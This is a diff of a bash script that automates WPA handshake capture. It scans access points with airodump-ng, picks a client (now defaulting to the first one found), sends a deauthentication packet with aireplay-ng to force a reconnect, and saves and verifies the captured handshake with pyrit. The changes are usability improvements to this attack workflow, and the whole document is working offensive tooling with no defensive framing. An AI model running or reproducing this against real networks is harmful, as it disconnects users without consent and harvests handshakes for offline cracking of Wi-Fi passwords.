@@ -3,7 +3,7 @@
 fapscan()
 {
 		clear
-		gnome-terminal -x airodump-ng mon0 -w "$HOME"/filw --output-format=csv&
+		gnome-terminal --geometry=130x20 -x airodump-ng mon0 -w "$HOME"/filw --output-format=csv&
 		$COLOR 2;echo "[*] Scanning for AP's with names like $ESSID [*]";$COLOR 9
 		sleep $SCN
 		killall airodump-ng
@@ -35,17 +35,30 @@ fcap()
 {
 	CHKEX="0"
 	fclientscan
-	$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
-	cat "$HOME"/jrifskf
-	read -p ' [*] Please paste clent MAC: ' CLIE
+	if [ $CNT = 1 ] 2> /dev/null
+		then
+			CLIE=$(head -1 "$HOME"/jrifskf)
+		else
+			$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
+			cat "$HOME"/jrifskf
+			echo
+			$COLOR 4;echo " [*] Please paste clent MAC or Press Enter to use first one:";$COLOR 9 
+			read -p "  >" CLIE
+	fi
+	if [ $CLIE -z ] 2> /dev/null
+		then
+			CLIE=$(head -1 "$HOME"/jrifskf)
+	fi
 	FILENAME="$BSSID""--""$RANDOM"
 	FILENAME2="$BSSID""-""$RANDOM"".cap"
-	gnome-terminal -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format pcap&
+	gnome-terminal --geometry=130x20 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format pcap&
 	$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
 	sleep 3
 	while [ true ]
 		do
 			clear
+			$COLOR 2;echo " [*] You should see [ WPA handshake: $BSSID ] in the airodump window if successful [*]"
+			echo
 			$COLOR 4;read -p " [*] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
 			if [ $WASCAP = "n" ] 2> /dev/null
 				then
@@ -62,23 +75,21 @@ fcap()
 	pyrit -r "$HOME"/Desktop/hs/"$FILENAME"-01.cap -o "$HOME"/Desktop/hs/$FILENAME2 strip
 	clear
 	rm "$HOME"/Desktop/hs/"$FILENAME"-01.cap
-	airmon-ng stop mon0
+	airmon-ng stop mon0&
 	rm -rf new.csv
 	rm -rf new2.csv
 	rm -rf new3.csv
 	rm -rf "$HOME"/filw*
 	rm -rf "$HOME"/jrifsk*
-	clear
-	ISDN=$( du -b "$HOME"/Desktop/hs/$FILENAME2)
-		
 	ISGOOD=$(pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze | grep good)
 	if [ ${ISGOOD:0:5} = '#' ]
 		then
-			$COLOR 2;echo " [*] Looks like handshake capture was successfull, Horray for you";$COLOR 9
+			clear
+			$COLOR 2;echo " [*] Looks like handshake capture was GOOD, Horray for you";$COLOR 9
 			$COLOR 4;echo $ISGOOD;$COLOR 9
 			echo
 			$COLOR 2;echo " [*] Handshake saved to "$HOME"/Desktop/hs/$FILENAME2";$COLOR 9
-
+			echo
 		else
 			$COLOR 1;echo " [*] Sorry, looks like there is a problem with captured handshake";$COLOR 9
 			echo
@@ -91,6 +102,7 @@ fcap()
 
 fexit()
 {
+			tput setab 9
 			airmon-ng stop mon0
 			rm -rf new.csv
 			rm -rf new2.csv
@@ -120,7 +132,7 @@ fclientscan()
 	clear
 	$COLOR 2;echo " [*] AP Found BSSID: $BSSID CHANNEL: $CHAN"
 	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
-	gnome-terminal  -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/jrifskr&
+	gnome-terminal --geometry=130x20  -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/jrifskr&
 	if [ $CHKBIT = 0 ] 2> /dev/null
 		then
 			sleep 7
